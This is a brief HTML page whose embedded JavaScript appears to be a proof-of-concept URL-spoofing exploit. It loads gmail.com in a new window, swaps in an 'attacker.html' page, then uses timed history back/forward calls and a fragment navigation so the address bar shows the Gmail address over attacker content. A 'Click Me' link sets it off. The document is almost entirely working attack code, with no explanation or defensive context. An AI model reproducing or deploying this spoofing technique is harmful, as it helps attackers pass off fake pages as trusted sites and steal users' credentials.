<script>
var w = null;
function spoof() {
  w = window.open("about:blank");

  // Step 1: Load victim page.
  w.location = "http://www.gmail.com";

  // Step 2: Navigate to attacker's page.
  setTimeout('w.location = "attacker.html"', 1000);

  // Step 3: Go back.
  setTimeout('w.history.back();', 2000);

  // Step 4: Go forward, but interrupt with a quick fragment navigation.
  setTimeout('w.history.forward(); setTimeout("w.location = \'http://www.gmail.com#URLspoof\'", 1);', 3000);
}
</script>

<a href="javascript:spoof();">Click Me</a>
